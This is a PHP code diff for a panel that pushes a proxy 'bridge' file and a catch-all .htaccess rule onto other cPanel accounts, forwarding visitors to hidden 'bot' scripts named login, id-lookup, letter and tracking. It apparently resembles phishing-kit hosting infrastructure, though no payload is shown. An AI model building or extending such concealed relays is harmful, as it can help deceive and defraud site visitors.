@@ -656,22 +656,13 @@ try {
             $domain = strtolower(trim((string)($input['domain'] ?? '')));
             if (!$cu) { json_out(['ok' => false, 'error' => 'Missing cpanelUser']); break; }
 
-            // Bridge architecture: deploy one small bridge file per bot endpoint.
-            // All source code stays on panelcou1999/bot-source — nothing is exposed on the target cPanel.
-            // Each bridge detects its own filename via SCRIPT_FILENAME and forwards to proxy.php.
-            // proxy.php validates bridge_key, restores visitor context, runs the real bot file.
+            // Single-file bridge: deploy only site.php + .htaccess to cPanel.
+            // .htaccess routes all bot endpoints (mobile.php, download.php, etc.) → site.php.
+            // site.php reads the target script from REQUEST_URI and forwards to proxy.php on panelcou1999.
 
             $deployed = []; $errors = [];
 
-            // Read bridge template from bot-source (site.php is the template)
-            $tpl_read = whm_cpanel_uapi('panelcou1999', 'Fileman', 'get_file_content',
-                ['dir' => '/public_html/bot-source', 'file' => 'site.php']);
-            if (!($tpl_read['status'] ?? 0)) {
-                json_out(['ok' => false, 'error' => 'Bridge template (site.php) not found in bot-source']);
-            }
-            $bridge_tpl = $tpl_read['data']['content'] ?? '';
-
-            // Ensure sites/{domain}/ dir + bot-config.json exist on panelcou1999 (same as deploy_bridge)
+            // Ensure sites/{domain}/ dir + bot-config.json exist on panelcou1999
             $sites_root = '/home/panelcou1999/public_html/sites';
             $site_dir   = $sites_root . '/' . $domain;
             if (!is_dir($site_dir)) @mkdir($site_dir, 0755, true);
@@ -693,38 +684,29 @@ try {
             file_put_contents($config_path,
                 json_encode($site_cfg, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
 
-            // Bake site identity into bridge template
+            // Build site.php with site_id + bridge_key baked in
+            $site_tpl = file_get_contents('/home/panelcou1999/public_html/bot-source/site.php');
+            if (!$site_tpl) {
+                json_out(['ok' => false, 'error' => 'site.php not found in bot-source']);
+            }
             $bridge_final = str_replace(
                 ['__SITE_ID__', '__BRIDGE_KEY__'],
                 [$domain,       $site_cfg['bridge_key']],
-                $bridge_tpl
+                $site_tpl
             );
 
-            // Bot endpoint files to deploy as bridges on the target cPanel
-            $bridge_files = [
-                'mobile.php', 'download.php', 'download-file.php',
-                'id-lookup.php', 'letter.php', 'letter-open.php',
-                'login.php', 'logout.php', 'proxy-dl.php',
-                'tracking.php', 'webhook.php', 'admin-dashboard.php',
-            ];
+            // Deploy site.php
+            $w = whm_cpanel_uapi($cu, 'Fileman', 'save_file_content',
+                ['dir' => '/public_html', 'file' => 'site.php', 'content' => $bridge_final]);
+            if ($w['status'] ?? 0) { $deployed[] = 'site.php'; }
+            else { $errors[] = 'site.php: ' . ($w['errors'][0] ?? 'write failed'); }
 
-            foreach ($bridge_files as $fname) {
-                $w = whm_cpanel_uapi($cu, 'Fileman', 'save_file_content',
-                    ['dir' => '/public_html', 'file' => $fname, 'content' => $bridge_final]);
-                if ($w['status'] ?? 0) { $deployed[] = $fname; }
-                else { $errors[] = "$fname: " . ($w['errors'][0] ?? 'write failed'); }
-            }
-
-            // Deploy .htaccess from bot-source (URL rewriting rules stay on cPanel)
-            $htaccess_read = whm_cpanel_uapi('panelcou1999', 'Fileman', 'get_file_content',
-                ['dir' => '/public_html/bot-source', 'file' => '.htaccess']);
-            if ($htaccess_read['status'] ?? 0) {
-                $hw = whm_cpanel_uapi($cu, 'Fileman', 'save_file_content',
-                    ['dir' => '/public_html', 'file' => '.htaccess',
-                     'content' => $htaccess_read['data']['content'] ?? '']);
-                if ($hw['status'] ?? 0) $deployed[] = '.htaccess';
-                else $errors[] = '.htaccess: write failed';
-            }
+            // Deploy .htaccess — routes all bot endpoints to site.php
+            $htaccess = "Options -Indexes\nRewriteEngine On\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule ^(?!site\\.php$)(.*)$ /site.php [L,QSA]\n";
+            $hw = whm_cpanel_uapi($cu, 'Fileman', 'save_file_content',
+                ['dir' => '/public_html', 'file' => '.htaccess', 'content' => $htaccess]);
+            if ($hw['status'] ?? 0) { $deployed[] = '.htaccess'; }
+            else { $errors[] = '.htaccess: ' . ($hw['errors'][0] ?? 'write failed'); }
 
             // Ensure sites/{domain}/letter-config.json exists (letter builder needs it)
             if (empty($site_cfg['ref_prefix'])) {
